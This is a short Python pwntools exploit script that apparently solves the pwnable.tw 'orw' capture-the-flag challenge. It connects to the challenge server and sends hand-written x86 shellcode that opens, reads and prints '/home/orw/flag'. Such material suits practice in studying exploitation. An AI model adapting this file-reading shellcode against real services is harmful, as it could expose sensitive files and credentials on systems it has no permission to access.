from pwn import *
from struct import pack
context.log_level = 'DEBUG'
h="chall.pwnable.tw"
p=10001
# p=process('./orw')
p=remote(h,p)
raw_input("#")
code='''
mov eax, 0x6761
push eax
mov eax, 0x6c662f77
push eax
mov eax, 0x726f2f65
push eax
mov eax, 0x6d6f682f
push eax
mov eax, 5
mov ebx, esp
mov ecx, 0
mov edx, 0
int 0x80

mov eax, 3
mov ebx, eax
mov ecx, esp
mov edx, 30
int 0x80

mov edx, 20
mov ecx, esp
mov ebx, 1
mov eax, 4
int 0x80
'''
code=asm(code)
p.recvuntil(':')
p.sendline(code)
p.interactive()
